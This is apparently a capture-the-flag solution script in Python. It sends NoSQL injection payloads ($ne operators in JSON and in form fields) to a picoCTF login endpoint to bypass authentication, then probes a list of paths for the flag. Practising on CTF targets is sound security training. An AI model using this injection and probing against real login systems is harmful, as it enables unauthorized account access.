import requests
base = 'http://wily-courier.picoctf.net:49463'
s = requests.Session()
# Try JSON NoSQL injection with $ne
r = s.post(base, json={'name': {'$ne': ''}, 'pass': {'$ne': ''}}, headers={'Content-Type': 'application/json'})
print('POST status:', r.status_code)
print('Cookies:', dict(s.cookies))
print('Response length:', len(r.content))
# Try to access /flag with session
for path in ['/flag', '/home', '/dashboard', '/admin', '/secret', '/user', '/api/flag', '/api/', '/data', '/profile', '/settings']:
    r2 = s.get(base + path)
    if r2.status_code == 200 and 'picoCTF' in r2.text:
        print(f'FLAG at {path}!')
        print(r2.text[:2000])
    elif r2.status_code != 404:
        print(f'{path}: {r2.status_code}')
print('Done')
# Also try with cookies from response
print('\nTrying raw cookie from headers')
r3 = requests.post(base, data={'name[$ne]': '', 'pass[$ne]': ''})
print('Cookie header:', r3.headers.get('Set-Cookie'))